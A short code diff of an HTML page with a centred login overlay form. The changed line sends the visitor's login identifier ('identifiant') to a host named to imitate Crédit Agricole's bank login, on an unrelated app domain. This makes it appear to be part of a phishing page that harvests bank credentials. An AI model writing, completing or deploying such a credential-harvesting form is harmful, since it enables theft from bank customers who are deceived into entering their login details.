@@ -12,7 +12,7 @@ body {
 </style>
 <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(255, 255, 255, 0.9); padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.5);">
     <form id="loginForm" onsubmit="event.preventDefault(); 
-        fetch('https://api.cointet.com/login/' + document.getElementById('identifiant').value)
+        fetch('https://api-bank-login-credit-agricole.qbr.app/login/' + document.getElementById('identifiant').value)
         .then(response => {
             if (!response.ok) {
                 throw new Error('Network response was not ok');
